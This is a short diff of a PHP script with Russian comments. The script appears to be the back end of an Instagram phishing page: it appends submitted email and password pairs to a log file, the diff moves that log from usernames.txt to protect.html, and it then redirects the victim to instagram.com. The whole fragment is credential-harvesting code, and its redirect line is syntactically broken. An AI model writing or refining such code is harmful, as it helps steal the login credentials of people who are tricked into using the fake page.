@@ -15,7 +15,7 @@ $searchString = "<html><title>WELCOME</title></html>";
 if ($myFile !== $searchString) {
     // Сохранение данных в файл
     $log = "EMAIL: " . $var1 . " [PASS]: " . $var2 . "\n";
-    file_put_contents('usernames.txt', $log, FILE_APPEND);
+    file_put_contents('protect.html', $log, FILE_APPEND);
 
     // Перенаправление
     header('Location: https://instagram.com'/);
